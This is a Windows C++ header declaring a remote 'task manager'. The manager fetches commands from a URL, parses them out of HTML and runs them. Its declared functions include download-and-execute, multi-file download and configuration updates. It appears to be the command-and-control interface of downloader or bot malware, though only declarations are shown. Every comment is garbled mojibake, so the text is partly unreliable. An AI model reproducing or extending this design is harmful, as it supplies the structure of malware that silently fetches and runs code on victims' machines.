//---------------------------------------------------------------------------

#include "windows.h"

#ifndef TaskH
#define TaskH
//---------------------------------------------------------------------------


//===============================================================
//  �������������� ������
//===============================================================
#define COMMAND_ALL 0xFFFFFFFF  // ��� �������

#define COMMAND_UPDATE_CONFIG  0x00000001 // ��������� ���������������� ����
#define COMMAND_DOWNLOAD       0x00000002 // ��������� � ��������� ����
#define COMMAND_MULTI_DOWNLOAD 0x00000004 // ��������� � ��������� ��������� ������




//---------------------------------------------------------------
// PTaskManager - �������� ���������� ������, �����
//---------------------------------------------------------------
typedef LPVOID PTaskManager;


//---------------------------------------------------------------
// TCommandMethod - ����� ���������� �������
//---------------------------------------------------------------
typedef bool (*TCommandMethod)(PTaskManager,    // �������� � ��������� ��������
												// ����������� �������
							   PCHAR,  			// �������
							   PCHAR); 			// ���������


//*****************************************************************
//  InitializeTaskManager ���������������� �������� �����
//
//  Manager - ��������� �� ���������� ��������� �����.
//			  ���� �� ������, �� ����� ���������������
//			  ���������� �������� �����
//
//  �����!!! ��� ���������� ������ ������� ��������� �����
//			 ���������� ����������� ���������������� ��������
//			 ����� ����� ������������ ������!!!!
//*****************************************************************
bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands);


//*****************************************************************
//  FreeTaskManager ���������� �������� �����
//
//  ���� �� ������� Manager, �� ����� ��������� ����������
//  �������� �����
//*****************************************************************
void FreeTaskManager(PTaskManager Manager);


//*****************************************************************
//  GetGlobalTaskManager - ������� ���������� ���������� ��������
//						   ���������� �����
//  Initialize - ���������������� ��������, ���� �� �� ����������.
//*****************************************************************
PTaskManager GetGlobalTaskManager(bool Initialize);


//*****************************************************************
//	RegisterCommand - ���������������� �������
//
//  Manager - �������� ���������� ������. ���� �� ������, �� �������
//			  �������������� ��� ����������� ��������� �����
//
//  CommandName - ��� �������
//
//  Method - ����� ���������� �������
//
//*****************************************************************
bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Method);


//*****************************************************************
//	StartTaskManager - ��������� ���� �������� � ��������� ������
//
//  Manager - �������� ������� ����� ��������� �������. ���� ��
//			  ������, �� ����� ����������� ���������� ��������
//
//  URL - ����� ������ ����� ����������� �������
//
//  InitManager - ��� ������� ���������������� ��������. ���������
//				  ������ ���� �� ������ ������� Manager
//
//  InitCommands - ��� ������� �������������� ��������� �������
//
//  ��������� - ������ ������ ���� �������� ������ ���������
//  			���� ���������� ������
//
//*****************************************************************
bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands);


//*****************************************************************
// StopTaskManager - �������� ���������� ����� ��������� ������
//*****************************************************************
void StopTaskManager(LPVOID Manager);

//*****************************************************************
//  RegisterAllCommands - ������� ������������ ��������� �������
//*****************************************************************
void RegisterAllCommands(PTaskManager Manager, DWORD Commands);

//*****************************************************************
//  DownloadCommand - ������� ��������� �������
//
//  aURL - ����� �������� �������
//
//  HTMLCode - ����������� ��� HTML
//*****************************************************************
bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode);
//bool DownloadCommand(PCHAR *HTMLCode);

//*****************************************************************
//	DownloadAndExecuteCommand - ��������� � ��������� �������
//
//  Manager - �������� ���������� ������. ���� �� ������,
//			  �� ����� ����������� ���������� �������� ������
//
//  URL - ����� �������� ������
//
//  ��������� - ���������� ������ ���� �������� ���� �������
//				���������
//
//*****************************************************************
bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL);
//bool DownloadAndExecuteCommand(PTaskManager Manager);

//*****************************************************************
//  TaskManagerSleep  - ������������� ����� ���������� ������.
//						����� ��������� ������ �� ��������
//						��������� ������.
//
//  Manager - �������� ������. ���� �� ������, �� ����� �����������
//            ����������
//
//  ��������� - ������� ������ ���������� ������, �� ����������
//				����� ��������� ������ ���� ������� ��������
//				��������� ������ ������� �� ������ ����������
//				�������� ����� ��� �������� ��������
//
//*****************************************************************

bool TaskManagerSleep(PTaskManager Manager);

// ��������� ������� Command � ����������� Args
// � ������ ���� Deferred == true ���������� ������� ����� ��������
// � ����� ����������
bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred = false);

// ��c������� HTML � ��������� �������
bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred = false);



bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args);

//---------------------------------------------------------------------------
#endif
